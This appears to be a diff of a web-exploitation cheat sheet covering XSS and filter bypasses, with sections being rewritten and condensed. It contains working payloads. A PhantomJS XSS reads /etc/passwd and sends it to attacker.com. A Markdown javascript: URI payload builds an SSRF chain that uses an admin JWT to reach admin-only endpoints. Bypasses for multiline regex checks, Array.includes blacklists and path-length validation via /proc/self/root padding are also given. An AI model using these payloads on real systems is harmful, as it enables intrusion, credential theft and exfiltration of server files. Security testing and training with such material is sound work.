-When XSS executes in PhantomJS (used for PDF generation, screenshots, etc.):
+**PhantomJS file:// read via XSS**:
 ```javascript
-// XHR to read local files:
-var x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();
-// Exfiltrate via img src or fetch to attacker server
+var x=new XMLHttpRequest(); x.open('GET','file:///etc/passwd',false); x.send();
 new Image().src='http://attacker.com/?data='+btoa(x.responseText);
 ```
 
-**Key insight**: Always check if sanitized output is consumed by another parser/renderer. Entity-safe output is only safe if ALL downstream consumers treat entities as literal text.
+## Markdown `javascript:` URI XSS — backtick `document.write`
 
----
-
-## Multiline Regex Bypass
-
-JavaScript regex with `/m` flag changes `^` and `$` to match line boundaries instead of string boundaries:
-
-```javascript
-// Vulnerable validation:
-if (/^[0-9]+$/m.test(input)) { /* "safe" numeric input */ }
-
-// Bypass with newline:
-"123
-alert(1)"  // "123" matches ^[0-9]+$ on first line, rest is ignored
-
-// URL-encoded: 123%0aalert(1)
+Markdown libs without `javascript:` stripping (`react-marked-markdown` ≤1.4.6, older `marked`, `simplemde`) execute on click or auto-render. `(`/`)` break Markdown link grammar — use backticks:
+```
+[XSS](javascript: document.write`<script>alert(1)</script>`)
 ```
 
-### Related: Array.includes() Type Confusion
-```javascript
-// Vulnerable check:
-if (blacklist.includes(input)) { reject(); }
-
-// Bypass: if input is an array instead of string, includes() always returns false
-// Send ?param[]=value instead of ?param=value
-// Express parses ?param[]=value as array, not string
+Cross-origin SSRF chain (admin views markdown rendered from public source):
+```python
+js = ("<script>"
+      "const x=new XMLHttpRequest\\x28\\x29;"
+      "x.open\\x28'GET','https://app.local/admin-only/{id}'\\x29;"
+      "x.setRequestHeader\\x28'Authorization','Bearer "+jwt+"'\\x29;"
+      "x.send\\x28\\x29;"
+      "</script>")
+title = f"[XSS](javascript: document.write`{js}`)"
 ```
+Defeats localhost-only `RestrictIP=127.0.0.1` because the request fires from the admin's local browser.
 
-### /proc/PID/root Path Padding
-When path length is validated with `.slice()` or `.substring()`:
-```
-// /proc/self/root is a symlink to /
-// Pad the path to exactly the expected length:
-/proc/self/root/proc/self/root/proc/self/root/etc/passwd
-// .slice(0, N) truncates but the path still resolves through symlinks
-```
+## Misc bypasses
 
----
+**Multiline regex `/m`**: `^[0-9]+$/m.test(input)` only matches a line boundary. Bypass: `123\nalert(1)` (URL-encoded `123%0aalert(1)`).
+
+**Array.includes type confusion**: `if (blacklist.includes(input))` — when `input` is an array, `includes` always false. Send `?param[]=value` (Express parses as array).
+
+**`/proc/PID/root` path padding**: when path is validated by `.slice(0, N)`, pad with symlink chains:
+`/proc/self/root/proc/self/root/proc/self/root/etc/passwd`.
 
 ## References
 
-1. **XSS Cheat Sheet**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
-2. **OWASP XSS Filter Evasion**: https://owasp.org/www-community/xss-filter-evasion-cheatsheet
-3. **HTML5 Security Cheatsheet**: https://html5sec.org/
-4. **AngularJS Sandbox Escapes**: https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
-
----
-
-**Document Version**: 1.0
-**Last Updated**: January 9, 2026
-**Source**: Real-world scenarios & security research
+- [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+- [OWASP XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+- [HTML5 Security Cheatsheet](https://html5sec.org/)
+- [AngularJS sandbox escapes (PortSwigger research)](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes)
